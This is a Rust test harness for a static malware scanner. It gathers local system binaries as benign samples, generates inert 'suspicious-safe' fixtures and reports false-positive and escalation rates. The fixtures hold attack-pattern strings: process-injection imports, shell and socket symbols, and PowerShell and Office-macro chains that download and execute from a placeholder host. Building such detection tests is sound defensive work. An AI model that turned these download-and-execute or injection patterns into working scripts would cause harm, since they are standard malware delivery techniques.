use std::collections::{BTreeMap, BTreeSet};
use std::env;
use std::fs;
use std::path::{Path, PathBuf};

#[allow(dead_code)]
#[path = "support/parser_fixtures.rs"]
mod parser_fixtures;

use parser_fixtures::{
    build_standard_elf_with_symbols, build_standard_macho, build_standard_pe_with_imports,
    build_test_elf_with_symbol_tables, build_test_macho_with_dylib_specs,
    build_test_pe_with_imports, unique_temp_path, ElfSymbolSpec, ElfSymbolTableSpec,
    MachoDylibSpec, MachoSegmentSpec, PeImportSpec, PeSectionSpec,
};
use projectx::r#static::config::ScanConfig;
use projectx::r#static::run_pipeline;
use projectx::r#static::types::Severity;
use serde::Serialize;
use sha2::{Digest, Sha256};

const REAL_BENIGN_CAP: usize = 150;
const GENERATED_BENIGN_PER_KIND: usize = 20;
const GENERATED_SUSPICIOUS_PER_KIND: usize = 20;

#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
enum FormatLabel {
    Pe,
    Elf,
    MachO,
    Script,
    ArchiveLike,
    OfficeLike,
    EncodedConfig,
    Other,
}

impl FormatLabel {
    fn as_str(self) -> &'static str {
        match self {
            Self::Pe => "PE",
            Self::Elf => "ELF",
            Self::MachO => "Mach-O",
            Self::Script => "script",
            Self::ArchiveLike => "archive_like",
            Self::OfficeLike => "office_like",
            Self::EncodedConfig => "encoded_config",
            Self::Other => "other",
        }
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum Label {
    Benign,
    SuspiciousSafe,
}

impl Label {
    fn as_str(self) -> &'static str {
        match self {
            Self::Benign => "benign",
            Self::SuspiciousSafe => "suspicious_safe",
        }
    }
}

#[derive(Clone, Debug)]
struct CorpusCase {
    path: PathBuf,
    label: Label,
    format: FormatLabel,
    category: String,
    source: String,
}

#[derive(Default, Serialize)]
struct CaseOutcome {
    path: String,
    category: String,
    format: String,
    source: String,
    severity: String,
}

#[derive(Default, Serialize)]
struct CorpusMetrics {
    total: usize,
    benign: usize,
    benign_clean: usize,
    false_positive: usize,
    suspicious_safe: usize,
    suspicious_safe_escalated: usize,
    clean_rate: String,
    false_positive_rate: String,
    suspicious_safe_escalation_rate: String,
    by_category: BTreeMap<String, usize>,
    by_format: BTreeMap<String, usize>,
    by_source: BTreeMap<String, usize>,
    rule_family_hits: BTreeMap<String, usize>,
    trust_hit_count: usize,
    trust_vendor_count: usize,
    trust_ecosystem_count: usize,
    false_positive_cases: Vec<CaseOutcome>,
    under_escalated_suspicious_safe_cases: Vec<CaseOutcome>,
}

#[derive(Serialize)]
struct FinalValidationReport {
    report: String,
    generated_at_note: String,
    real_benign_cap: usize,
    generated_benign_per_kind: usize,
    generated_suspicious_per_kind: usize,
    manifests: BTreeMap<String, String>,
    real_benign_acquired_count: usize,
    generated_benign_count: usize,
    generated_suspicious_safe_count: usize,
    total_tested: usize,
    metrics: CorpusMetrics,
    pe_metrics: CorpusMetrics,
    elf_metrics: CorpusMetrics,
    macho_metrics: CorpusMetrics,
    externally_sourced_notes: Vec<String>,
    generated_notes: Vec<String>,
    protection_validation_status: String,
    what_this_proves: Vec<String>,
    what_this_does_not_prove: Vec<String>,
}

fn workspace_path(parts: &[&str]) -> PathBuf {
    let mut path = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    for part in parts {
        path.push(part);
    }
    path
}

fn run_fixture(path: &Path) -> (projectx::r#static::context::ScanContext, Severity) {
    run_pipeline(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap()
}

fn rate(ok: usize, total: usize) -> String {
    format!("{ok}/{total}")
}

fn detect_format(bytes: &[u8]) -> FormatLabel {
    if bytes.starts_with(b"MZ") {
        FormatLabel::Pe
    } else if bytes.starts_with(b"\x7fELF") {
        FormatLabel::Elf
    } else if bytes.starts_with(&0xFEEDFACFu32.to_be_bytes())
        || bytes.starts_with(&0xCFFAEDFEu32.to_le_bytes())
        || bytes.starts_with(&0xCAFEBABEu32.to_be_bytes())
        || bytes.starts_with(&0xBEBAFECAu32.to_le_bytes())
    {
        FormatLabel::MachO
    } else {
        FormatLabel::Other
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    format!("{:x}", hasher.finalize())
}

fn collect_real_benign(corpus_root: &Path) -> Vec<CorpusCase> {
    let real_root = corpus_root.join("real_benign");
    fs::create_dir_all(&real_root).unwrap();
    let mut cases = Vec::new();
    let mut seen = BTreeSet::new();
    let mut candidates = Vec::new();

    for root in ["/bin", "/usr/bin"] {
        let Ok(read_dir) = fs::read_dir(root) else {
            continue;
        };
        for entry in read_dir.flatten() {
            let path = entry.path();
            if path.is_file() {
                candidates.push(path);
            }
        }
    }
    candidates.sort();

    for path in candidates {
        if cases.len() >= REAL_BENIGN_CAP {
            break;
        }
        let Ok(metadata) = fs::metadata(&path) else {
            continue;
        };
        if metadata.len() == 0 || metadata.len() > 2 * 1024 * 1024 {
            continue;
        }
        let Ok(bytes) = fs::read(&path) else {
            continue;
        };
        let format = detect_format(&bytes);
        if matches!(format, FormatLabel::Other) {
            continue;
        }
        let digest = sha256_hex(&bytes);
        if !seen.insert(digest.clone()) {
            continue;
        }
        let file_name = path
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("sample");
        let extension = match format {
            FormatLabel::Pe => "exe",
            FormatLabel::Elf => "elf",
            FormatLabel::MachO => "macho",
            _ => "bin",
        };
        let dest = real_root.join(format!("{digest}_{file_name}.{extension}"));
        fs::write(&dest, &bytes).unwrap();
        cases.push(CorpusCase {
            path: dest,
            label: Label::Benign,
            format,
            category: "real_system_binary".to_string(),
            source: "local_system_copy".to_string(),
        });
    }

    cases
}

fn suspicious_fixture_path(category: &str, name: &str) -> PathBuf {
    workspace_path(&["tests", "fixtures", "suspicious_safe", category, name])
}

fn generated_benign_bytes(format: FormatLabel, index: usize) -> Vec<u8> {
    match format {
        FormatLabel::Pe => build_standard_pe_with_imports(
            &[PeImportSpec {
                dll: "kernel32.dll",
                functions: &["LoadLibraryA", "GetProcAddress"],
            }],
            format!("VersionInfo signed package metadata benign release {index}").as_bytes(),
        ),
        FormatLabel::Elf => build_standard_elf_with_symbols(
            &[
                ElfSymbolSpec { name: "dlopen" },
                ElfSymbolSpec { name: "dlsym" },
            ],
            format!("distro package metadata benign release {index}").as_bytes(),
        ),
        FormatLabel::MachO => {
            build_standard_macho(format!("app bundle metadata benign release {index}").as_bytes())
        }
        FormatLabel::Script => {
            format!("# benign ci helper {index}\nWrite-Host 'dry-run package validation'\n").into()
        }
        FormatLabel::ArchiveLike => {
            format!("archive inventory {index}\nassets/config.json\nREADME.md\n").into()
        }
        FormatLabel::OfficeLike => {
            format!("benign template macro outline {index}\nformat cells and refresh local table\n")
                .into()
        }
        FormatLabel::EncodedConfig => {
            format!("benign config {index}\nasset_stub=QUJDREVGRw==\ntemplate_only=true\n").into()
        }
        FormatLabel::Other => format!("benign note {index}\n").into(),
    }
}

fn generated_suspicious_bytes(format: FormatLabel, index: usize) -> Vec<u8> {
    match format {
        FormatLabel::Pe => {
            let mut payload =
                fs::read(suspicious_fixture_path("binary", "pe_injection_chain.txt")).unwrap();
            payload.extend_from_slice(
                format!("\nvariant={index} inert suspicious-safe PE chain\n").as_bytes(),
            );
            build_test_pe_with_imports(
                &[
                    PeSectionSpec {
                        name: ".text",
                        virtual_size: 0x800,
                        raw_size: 0x400,
                        characteristics: 0x6000_0020,
                    },
                    PeSectionSpec {
                        name: ".idata",
                        virtual_size: 0x800,
                        raw_size: 0x400,
                        characteristics: 0xC000_0040,
                    },
                ],
                &[PeImportSpec {
                    dll: "kernel32.dll",
                    functions: &["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread"],
                }],
                &payload,
            )
        }
        FormatLabel::Elf => build_test_elf_with_symbol_tables(
            &[".text", ".strtab", ".symtab", ".interp", ".shstrtab"],
            Some("/lib64/ld-linux-x86-64.so.2"),
            ElfSymbolTableSpec {
                dyn_symbols: &[],
                static_symbols: &[
                    ElfSymbolSpec { name: "execve" },
                    ElfSymbolSpec { name: "system" },
                    ElfSymbolSpec { name: "socket" },
                    ElfSymbolSpec { name: "connect" },
                ],
            },
            format!("/bin/sh connect placeholder runtime notes {index}").as_bytes(),
        ),
        FormatLabel::MachO => build_test_macho_with_dylib_specs(
            &[MachoSegmentSpec {
                name: "__TEXT",
                maxprot: 5,
                initprot: 5,
                sections: &["__text"],
            }],
            &[
                MachoDylibSpec {
                    path: "@loader_path/Frameworks/Helper.framework/Helper",
                    command: 0x8000_0018,
                },
                MachoDylibSpec {
                    path: "/usr/lib/libSystem.B.dylib",
                    command: 0x0000_000c,
                },
            ],
            format!("dlopen dlsym vm_protect placeholder notes {index}").as_bytes(),
        ),
        FormatLabel::Script => format!(
            "# inert suspicious-safe script chain {index}\nInvoke-WebRequest http://example.invalid/a -OutFile placeholder.txt\nExpand-Archive placeholder.zip .\nStart-Process placeholder.txt\n"
        )
        .into(),
        FormatLabel::ArchiveLike => format!(
            "archive extract execute chain {index}\nExpand-Archive placeholder.zip\nStart-Process placeholder.txt\n"
        )
        .into(),
        FormatLabel::OfficeLike => format!(
            "AutoOpen template download stage {index}\nURLDownloadToFile http://example.invalid/template placeholder\nShell placeholder\n"
        )
        .into(),
        FormatLabel::EncodedConfig => format!(
            "encoded config loader chain {index}\nconfig=stage\npayload=SQBFAFgA\nFromBase64String\nLoadLibrary\nStart-Process placeholder\ndlopen placeholder\n"
        )
        .into(),
        FormatLabel::Other => format!("suspicious-safe note {index}\n").into(),
    }
}

fn materialize_generated(corpus_root: &Path, label: Label) -> Vec<CorpusCase> {
    let mut cases = Vec::new();
    let formats = [
        FormatLabel::Pe,
        FormatLabel::Elf,
        FormatLabel::MachO,
        FormatLabel::Script,
        FormatLabel::ArchiveLike,
        FormatLabel::OfficeLike,
        FormatLabel::EncodedConfig,
    ];
    let count = match label {
        Label::Benign => GENERATED_BENIGN_PER_KIND,
        Label::SuspiciousSafe => GENERATED_SUSPICIOUS_PER_KIND,
    };
    for format in formats {
        let dir = corpus_root
            .join(label.as_str())
            .join(format.as_str().replace('-', "_"));
        fs::create_dir_all(&dir).unwrap();
        for index in 0..count {
            let bytes = match label {
                Label::Benign => generated_benign_bytes(format, index),
                Label::SuspiciousSafe => generated_suspicious_bytes(format, index),
            };
            let extension = match format {
                FormatLabel::Pe => "exe",
                FormatLabel::Elf => "elf",
                FormatLabel::MachO => "dylib",
                FormatLabel::Script => "ps1",
                _ => "txt",
            };
            let path = dir.join(format!("{}_v{:03}.{extension}", label.as_str(), index));
            fs::write(&path, bytes).unwrap();
            cases.push(CorpusCase {
                path,
                label,
                format,
                category: format.as_str().to_string(),
                source: "generated_safe".to_string(),
            });
        }
    }
    cases
}

fn write_manifest(path: &Path, cases: &[CorpusCase]) {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    let lines = cases
        .iter()
        .map(|case| {
            serde_json::json!({
                "path": case.path,
                "label": case.label.as_str(),
                "format": case.format.as_str(),
                "category": case.category,
                "source": case.source,
            })
            .to_string()
        })
        .collect::<Vec<_>>()
        .join("\n");
    fs::write(path, lines).unwrap();
}

fn add_context_metrics(
    ctx: &projectx::r#static::context::ScanContext,
    metrics: &mut CorpusMetrics,
) {
    for finding in ctx
        .findings
        .iter()
        .filter(|finding| finding.code == "YARA_MATCH")
    {
        if let Some(family) = finding
            .message
            .split(" family ")
            .nth(1)
            .and_then(|rest| rest.split(';').next())
        {
            *metrics
                .rule_family_hits
                .entry(family.to_string())
                .or_insert(0) += 1;
        }
    }
    if let Some(intelligence) = &ctx.intelligence {
        metrics.trust_hit_count += intelligence.trust_reasons.len();
        metrics.trust_vendor_count += intelligence.trust_vendors.len();
        metrics.trust_ecosystem_count += intelligence.trust_ecosystems.len();
    }
}

fn evaluate_cases(cases: &[CorpusCase]) -> CorpusMetrics {
    let mut metrics = CorpusMetrics::default();
    for case in cases {
        metrics.total += 1;
        *metrics
            .by_category
            .entry(case.category.clone())
            .or_insert(0) += 1;
        *metrics
            .by_format
            .entry(case.format.as_str().to_string())
            .or_insert(0) += 1;
        *metrics.by_source.entry(case.source.clone()).or_insert(0) += 1;
        let (ctx, severity) = run_fixture(&case.path);
        add_context_metrics(&ctx, &mut metrics);
        match case.label {
            Label::Benign => {
                metrics.benign += 1;
                if matches!(severity, Severity::Clean) {
                    metrics.benign_clean += 1;
                } else {
                    metrics.false_positive_cases.push(CaseOutcome {
                        path: case.path.display().to_string(),
                        category: case.category.clone(),
                        format: case.format.as_str().to_string(),
                        source: case.source.clone(),
                        severity: format!("{severity:?}"),
                    });
                }
            }
            Label::SuspiciousSafe => {
                metrics.suspicious_safe += 1;
                if !matches!(severity, Severity::Clean) {
                    metrics.suspicious_safe_escalated += 1;
                } else {
                    metrics
                        .under_escalated_suspicious_safe_cases
                        .push(CaseOutcome {
                            path: case.path.display().to_string(),
                            category: case.category.clone(),
                            format: case.format.as_str().to_string(),
                            source: case.source.clone(),
                            severity: format!("{severity:?}"),
                        });
                }
            }
        }
    }
    metrics.false_positive = metrics.benign.saturating_sub(metrics.benign_clean);
    metrics.clean_rate = rate(metrics.benign_clean, metrics.benign);
    metrics.false_positive_rate = rate(metrics.false_positive, metrics.benign);
    metrics.suspicious_safe_escalation_rate =
        rate(metrics.suspicious_safe_escalated, metrics.suspicious_safe);
    metrics
}

fn filter_format(cases: &[CorpusCase], format: FormatLabel) -> Vec<CorpusCase> {
    cases
        .iter()
        .filter(|case| case.format == format)
        .cloned()
        .collect()
}

#[test]
fn final_validation_report_is_generated() {
    let root = workspace_path(&["quarantine", "final_validation"]);
    let corpus_root = root.join("corpus");
    let manifest_root = root.join("manifests");
    let _ = fs::remove_dir_all(&root);
    fs::create_dir_all(&corpus_root).unwrap();

    let mut cases = Vec::new();
    let real_benign = collect_real_benign(&corpus_root);
    let generated_benign = materialize_generated(&corpus_root, Label::Benign);
    let generated_suspicious = materialize_generated(&corpus_root, Label::SuspiciousSafe);
    cases.extend(real_benign.clone());
    cases.extend(generated_benign.clone());
    cases.extend(generated_suspicious.clone());

    let benign_cases = cases
        .iter()
        .filter(|case| case.label == Label::Benign)
        .cloned()
        .collect::<Vec<_>>();
    let suspicious_cases = cases
        .iter()
        .filter(|case| case.label == Label::SuspiciousSafe)
        .cloned()
        .collect::<Vec<_>>();
    let pe_cases = filter_format(&cases, FormatLabel::Pe);
    let elf_cases = filter_format(&cases, FormatLabel::Elf);
    let macho_cases = filter_format(&cases, FormatLabel::MachO);

    let manifests = BTreeMap::from([
        (
            "combined_benign".to_string(),
            manifest_root.join("combined_benign.jsonl"),
        ),
        (
            "combined_suspicious_safe".to_string(),
            manifest_root.join("combined_suspicious_safe.jsonl"),
        ),
        ("pe".to_string(), manifest_root.join("pe.jsonl")),
        ("elf".to_string(), manifest_root.join("elf.jsonl")),
        ("macho".to_string(), manifest_root.join("macho.jsonl")),
    ]);
    write_manifest(manifests.get("combined_benign").unwrap(), &benign_cases);
    write_manifest(
        manifests.get("combined_suspicious_safe").unwrap(),
        &suspicious_cases,
    );
    write_manifest(manifests.get("pe").unwrap(), &pe_cases);
    write_manifest(manifests.get("elf").unwrap(), &elf_cases);
    write_manifest(manifests.get("macho").unwrap(), &macho_cases);

    let metrics = evaluate_cases(&cases);
    let pe_metrics = evaluate_cases(&pe_cases);
    let elf_metrics = evaluate_cases(&elf_cases);
    let macho_metrics = evaluate_cases(&macho_cases);

    let manifest_strings = manifests
        .iter()
        .map(|(key, path)| (key.clone(), path.display().to_string()))
        .collect();
    let report = FinalValidationReport {
        report: "final_validation_report".to_string(),
        generated_at_note: "Deterministic local run; no unsafe samples or behavioral execution"
            .to_string(),
        real_benign_cap: REAL_BENIGN_CAP,
        generated_benign_per_kind: GENERATED_BENIGN_PER_KIND,
        generated_suspicious_per_kind: GENERATED_SUSPICIOUS_PER_KIND,
        manifests: manifest_strings,
        real_benign_acquired_count: real_benign.len(),
        generated_benign_count: generated_benign.len(),
        generated_suspicious_safe_count: generated_suspicious.len(),
        total_tested: cases.len(),
        metrics,
        pe_metrics,
        elf_metrics,
        macho_metrics,
        externally_sourced_notes: vec![
            "Real benign files were copied from local system binary paths into the workspace before scanning; original system paths were not modified.".to_string(),
            "No network dataset was downloaded in this run.".to_string(),
        ],
        generated_notes: vec![
            "Generated benign and suspicious-safe samples are deterministic, inert, and stored under quarantine/final_validation/corpus.".to_string(),
            "Generated PE, ELF, and Mach-O samples use the shared parser fixture builders rather than unsafe binaries.".to_string(),
        ],
        protection_validation_status: "Covered by cargo test real-time protection regressions; no live filesystem replay was performed in this final report.".to_string(),
        what_this_proves: vec![
            "The scanner produced exact, auditable clean/escalation measurements across the prepared local real-benign plus generated safe corpus in this environment.".to_string(),
            "The produced manifests can be reused by the format benchmark harnesses for PE, ELF, and Mach-O scoped validation.".to_string(),
        ],
        what_this_does_not_prove: vec![
            "This is not a malware benchmark and does not include unsafe samples.".to_string(),
            "This does not prove global 99% AV accuracy or behavioral detection quality.".to_string(),
            "PE and ELF external real-world breadth remains limited when the local host does not provide those formats.".to_string(),
        ],
    };

    let serialized_report = serde_json::to_string_pretty(&report).unwrap();
    let output = root.join("final_validation_report.json");
    fs::write(&output, &serialized_report).unwrap();
    let shared_output = workspace_path(&[
        "quarantine",
        "validation_reports",
        "final_validation_report.json",
    ]);
    if let Some(parent) = shared_output.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    fs::write(&shared_output, &serialized_report).unwrap();
    eprintln!("final validation report:\n{}", serialized_report);

    assert!(report.total_tested > 0);

    // Keep a smoke path around for developers who want a one-off location in temp.
    let _ = unique_temp_path("projectx_final_validation_complete", "txt");
}
